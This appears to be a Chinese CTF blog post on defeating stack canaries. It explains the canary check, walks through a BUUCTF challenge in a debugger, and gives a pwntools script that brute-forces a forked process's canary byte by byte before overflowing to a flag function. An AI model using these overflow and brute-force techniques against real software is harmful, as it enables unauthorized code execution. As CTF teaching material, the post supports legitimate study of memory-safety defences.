@@ -1,0 +1,549 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    绕过防御之击败canary保护 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="绕过防御之击败canary保护canary的认识和原理函数在开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，即栈帧销毁前测试该值是否被改动，如果不合法就停止运行。在 Linux 系统当中我们将这段 cookie 信息称为 Canary Canary 是一个低字节位 \x00 的十六进制数。 由于 Canary 在局部变量的后面，在 EBP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过防御之击败canary保护">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%E4%B9%8B%E5%87%BB%E8%B4%A5canary%E4%BF%9D%E6%8A%A4/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="绕过防御之击败canary保护canary的认识和原理函数在开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，即栈帧销毁前测试该值是否被改动，如果不合法就停止运行。在 Linux 系统当中我们将这段 cookie 信息称为 Canary Canary 是一个低字节位 \x00 的十六进制数。 由于 Canary 在局部变量的后面，在 EBP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe-258458.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769252853426-7a562d91-ed0c-408b-bd9a-da105b9676ed-605401.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769253522213-83b48051-7a57-45c3-8f64-aae3f041f409-711690.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769413452772-8867ca58-b66c-479f-849a-7418d73349fc-342754.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe-258458.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769263861346-44a5c42f-3c83-4c67-aa03-06a8fdeb976d-199470.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769263895860-c2789553-f0e4-4a0d-b895-106bc2b472eb-078484.png">
+<meta property="article:published_time" content="2026-04-28T10:25:56.984Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.390Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/73098186_K9qxwuu26oxqE8fz/1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe-258458.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="绕过防御之击败canary保护">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">绕过防御之击败canary保护</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%98%B2%E5%BE%A1%E4%B9%8B%E5%87%BB%E8%B4%A5canary%E4%BF%9D%E6%8A%A4"><span class="toc-number">1.</span> <span class="toc-text">绕过防御之击败canary保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary%E7%9A%84%E8%AE%A4%E8%AF%86%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">canary的认识和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9-canary-%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">对 canary 的简单叙述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Canary-%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">Canary 的绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary%E7%BB%95%E8%BF%87-%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">Canary绕过 方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Canary2%E7%BB%95%E8%BF%87-%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">Canary2绕过 方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#canary%E7%88%86%E7%A0%B4%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">canary爆破原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#canary2exp"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">canary2exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E7%A0%B4exp%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">爆破exp分析</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/绕过防御之击败canary保护" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:56.984Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="绕过防御之击败canary保护"><a href="#绕过防御之击败canary保护" class="headerlink" title="绕过防御之击败canary保护"></a>绕过防御之击败canary保护</h1><h3 id="canary的认识和原理"><a href="#canary的认识和原理" class="headerlink" title="canary的认识和原理"></a>canary的认识和原理</h3><p>函数在开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，即栈帧销毁前测试该值是否被改动，如果不合法就停止运行。在 Linux 系统当中我们将这段 cookie 信息称为 Canary</p>
+<p>Canary 是一个低字节位 \x00 的十六进制数。</p>
+<p>由于 Canary 在局部变量的后面，在 EBP 或 RBP 的前面，所以当攻击者覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，这就会导致栈保护检查失败而阻止 payload 的运行，从而避免漏洞被利用成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* 典型的 x86-64 Linux 进程栈布局 (从高地址到低地址):</span><br><span class="line">*</span><br><span class="line">* 高地址</span><br><span class="line">* |-------------------|</span><br><span class="line">* | 命令行参数和环境变量  |</span><br><span class="line">* |-------------------| ← 0x7ffffffff000 附近</span><br><span class="line">* |        ...        |</span><br><span class="line">* |-------------------|</span><br><span class="line">* |     canary值      | ← 栈保护金丝雀 (Stack Canary)</span><br><span class="line">* |-------------------|</span><br><span class="line">* |   保存的RBP寄存器   | ← 当前函数的栈帧基址</span><br><span class="line">* |-------------------|</span><br><span class="line">* |   保存的返回地址    | ← RIP (下一条指令地址)</span><br><span class="line">* |-------------------|</span><br><span class="line">* |     局部变量       |</span><br><span class="line">* |-------------------|</span><br><span class="line">* |     函数参数       | ← 被调用函数的参数</span><br><span class="line">* |-------------------|</span><br><span class="line">* |        ...        |</span><br><span class="line">* 低地址</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+
+<h3 id="对-canary-的简单叙述"><a href="#对-canary-的简单叙述" class="headerlink" title="对 canary 的简单叙述"></a>对 canary 的简单叙述</h3><p>为了更清晰地了解 canary 的保护过程和破解方式，我们通过一道练习去进一步了解 canary 的栈情况。</p>
+<p><em><strong>BUUCTF[NewStarCTF 公开赛赛道]canary</strong></em></p>
+<p><img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe-258458.png" alt="1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the zoo to adopt your canary&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you v me 50, I will tell you the correct key&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now answer me, will you v me 50&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to the canary&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)money);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>canary 总是出现在局部变量的后面和 EBP 或者 RBP 之前，所以我们运行到 read 函数执行之前看一看栈的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RBP  0x7fffffffdce0 ◂— 1</span><br><span class="line">RSP  0x7fffffffdcb0 ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769252853426-7a562d91-ed0c-408b-bd9a-da105b9676ed-605401.png" alt="1769252853426-7a562d91-ed0c-408b-bd9a-da105b9676ed.png"></p>
+<p><strong><font style="color:#DF2A3F;">在 RBP 之前，且末尾以 00 结尾的就是 canary &#x3D;&#x3D;&gt;0xde32329de0620700</font></strong></p>
+<p><font style="color:#000000;">继续 si 进入到 read 函数当中了解 canary 保护的方法。</font><img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769253522213-83b48051-7a57-45c3-8f64-aae3f041f409-711690.png" alt="1769253522213-83b48051-7a57-45c3-8f64-aae3f041f409.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x555555400aa9</span> &lt;main+<span class="number">197</span>&gt;                      mov    eax, <span class="number">0</span>                       EAX =&gt; <span class="number">0</span></span><br><span class="line">► <span class="number">0x555555400aae</span> &lt;main+<span class="number">202</span>&gt;                      mov    rcx, qword ptr [rbp - <span class="number">8</span>]     RCX, [<span class="number">0x7fffffffdcd8</span>] =&gt; <span class="number">0xde32329de0620700</span></span><br><span class="line">  <span class="number">0x555555400ab2</span> &lt;main+<span class="number">206</span>&gt;                      xor    rcx, qword ptr fs:[<span class="number">0x28</span>]     RCX =&gt; <span class="number">0</span> (<span class="number">0xde32329de0620700</span> ^ <span class="number">0xde32329de0620700</span>)</span><br><span class="line">  <span class="number">0x555555400abb</span> &lt;main+<span class="number">215</span>&gt;                    ✔ je     main+<span class="number">222</span>                    &lt;main+<span class="number">222</span>&gt;</span><br><span class="line">  ↓</span><br><span class="line">  <span class="number">0x555555400ac2</span> &lt;main+<span class="number">222</span>&gt;                      leave </span><br><span class="line">  <span class="number">0x555555400ac3</span> &lt;main+<span class="number">223</span>&gt;                      ret                                &lt;__libc_start_call_main+<span class="number">120</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在函数序言部分会取 fs 寄存器 0z28 处的值存放在 rbp-0x8 的位置，在函数返回前会将该值去除，并与 fs:0x28 的值进行异或，检查 canary 是否被破坏。当我们覆盖掉 Canary 的时候，进行异或的值就不会为 0，验证失败。</p>
+<p>因此我们之前直接覆盖 rbp&#x2F;ebp 的做法就失效了。我们就要寻找其他方式去绕过 Canary。</p>
+<h3 id="Canary-的绕过方法"><a href="#Canary-的绕过方法" class="headerlink" title="Canary 的绕过方法"></a>Canary 的绕过方法</h3><h4 id="Canary绕过-方法一"><a href="#Canary绕过-方法一" class="headerlink" title="Canary绕过 方法一"></a>Canary绕过 方法一</h4><p>Canary 设计以字节 \x 结尾，其本意就是保证 Canary 可以阶段字符串，防止我们输出字符串的时候将 Canary，所以泄露站中的 Canary 的思路是将 Canary 的低字节 \x00 覆盖，然后连同用户的字符串一起打印出剩余的 Canary 部分。当我们打印出完整的 Canary 后，在溢出的时候再将正确的 Canary 填充回去，就可以进行控制返回地址，控制程序流程，从而获取 shell 了。</p>
+<p>条件：1）有合适的输出函数 2）泄露 Canary 后程序不会崩溃</p>
+<p>由于[NewStarCTF 公开赛赛道]canary 难度过高，我们换一道题目当做练习 <strong>BUUCTF</strong> <strong>bjdctf_2020_babyrop2</strong><img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769413452772-8867ca58-b66c-479f-849a-7418d73349fc-342754.png" alt="1769413452772-8867ca58-b66c-479f-849a-7418d73349fc.png"></p>
+<p>我们继续以_**BUUCTF[NewStarCTF 公开赛赛道]canary **_为例</p>
+<p><img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe-258458.png" alt="1769252088534-06b42e9b-692f-45c1-b9b4-fe1598dd8fbe.png"></p>
+<p>我们可以找到 system 和&#x2F;bin&#x2F;sh 去构造后门函数，利用方式就是基本的 ret2syscall，不过我们还需要利用方式。<img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769263861346-44a5c42f-3c83-4c67-aa03-06a8fdeb976d-199470.png" alt="1769263861346-44a5c42f-3c83-4c67-aa03-06a8fdeb976d.png"><img src="/HFTTC.github.io/./img/73098186_K9qxwuu26oxqE8fz/1769263895860-c2789553-f0e4-4a0d-b895-106bc2b472eb-078484.png" alt="1769263895860-c2789553-f0e4-4a0d-b895-106bc2b472eb.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the zoo to adopt your canary&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you v me 50, I will tell you the correct key&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now answer me, will you v me 50&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to the canary&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)money);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路：通过第一次覆盖，将前面的字节全部填充满，并将canary之前的最后一个字节也覆盖填充，之后打印出canary的值，之后第二次再相同位置填充canary的值，之后去进行栈溢出操作</p>
+<h4 id="Canary2绕过-方法二"><a href="#Canary2绕过-方法二" class="headerlink" title="Canary2绕过 方法二"></a>Canary2绕过 方法二</h4><h5 id="canary爆破原理"><a href="#canary爆破原理" class="headerlink" title="canary爆破原理"></a>canary爆破原理</h5><p>先对于Canary，虽然每一次进程重启之后的Canary不同，但是用一个进程的不同线程的Canary是相同的，并且通过fork函数创建的在子进程中的Canary也是相同的，因为fork函数会直接拷贝父进程的内存。最低位是0x00，之后初次爆破，如果canary爆破不成功，则程序崩溃，爆破成功则程序进行，由此可以推断Canary是否爆破成功</p>
+<h5 id="canary2exp"><a href="#canary2exp" class="headerlink" title="canary2exp"></a>canary2exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&#x27;./pwn2&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf = ELF(name)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(j))</span><br><span class="line">        p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(j))</span><br><span class="line">        a = p.recvuntil(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;recv&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = u32(canary)</span><br><span class="line">success(<span class="string">&quot;canary: &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">getflag = <span class="number">0x0804863B</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + p32(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
